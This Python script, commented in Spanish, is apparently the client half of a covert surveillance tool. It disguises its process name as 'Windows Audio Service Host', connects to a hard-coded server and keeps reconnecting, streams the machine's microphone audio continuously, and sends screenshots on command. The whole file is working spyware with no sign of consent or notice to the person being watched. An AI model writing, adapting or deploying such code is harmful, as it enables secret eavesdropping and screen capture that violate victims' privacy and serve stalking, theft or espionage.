import socket
import pyaudio
import threading
import pyautogui
import io
import time
import sys
import setproctitle

# --- Configuración ---
setproctitle.setproctitle("Windows Audio Service Host") 
IP_DEL_SERVIDOR = '192.168.36.247' # <--- Asegúrate que esta IP sea la correcta
PUERTO = 5001
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

# EL CANDADO: Evita que el audio y la imagen se mezclen en el "cable" (socket)
socket_lock = threading.Lock()

def capturar_y_enviar_pantalla(sock):
    """Captura y envía la pantalla asegurando exclusividad del socket."""
    try:
        screenshot = pyautogui.screenshot()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="JPEG", quality=40)
        img_bytes = buffer.getvalue()
        
        with socket_lock: # Bloqueamos el socket para que el audio no interfiera
            sock.sendall(b"IMG:") 
            sock.sendall(len(img_bytes).to_bytes(4, byteorder='big'))
            sock.sendall(img_bytes)
        print("[*] Captura enviada con éxito.")
    except Exception as e:
        print(f"[-] Error en captura: {e}")

def flujo_audio(sock, stream):
    """Hilo de audio con manejo de errores y bloqueo de seguridad."""
    try:
        while True:
            data = stream.read(CHUNK, exception_on_overflow=False)
            with socket_lock: # Si se está enviando una foto, el audio espera aquí
                sock.sendall(b"AUD:" + data)
    except Exception as e:
        print(f"[-] Error en flujo de audio: {e}")

def iniciar_cliente():
    p = pyaudio.PyAudio()
    
    while True:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print(f"[*] Intentando conectar a {IP_DEL_SERVIDOR}...")
            client_socket.connect((IP_DEL_SERVIDOR, PUERTO))
            print("[+] Conectado al servidor.")
            
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, 
                            input=True, frames_per_buffer=CHUNK)

            # Iniciar hilo de audio
            thread_audio = threading.Thread(target=flujo_audio, args=(client_socket, stream), daemon=True)
            thread_audio.start()

            # Bucle de comandos
            while True:
                comando = client_socket.recv(1024).decode('utf-8', errors='ignore')
                if not comando: break
                
                if "SCREEN" in comando:
                    # Usamos un hilo para no congelar la recepción de otros comandos
                    threading.Thread(target=capturar_y_enviar_pantalla, args=(client_socket,), daemon=True).start()
                
        except (ConnectionRefusedError, socket.error):
            print("[-] Servidor no disponible. Reintentando en 5 segundos...")
            time.sleep(5) # Delay para evitar el bucle infinito de logs
        except Exception as e:
            print(f"[-] Error inesperado: {e}")
            time.sleep(5)
        finally:
            client_socket.close()

if __name__ == "__main__":
    iniciar_cliente()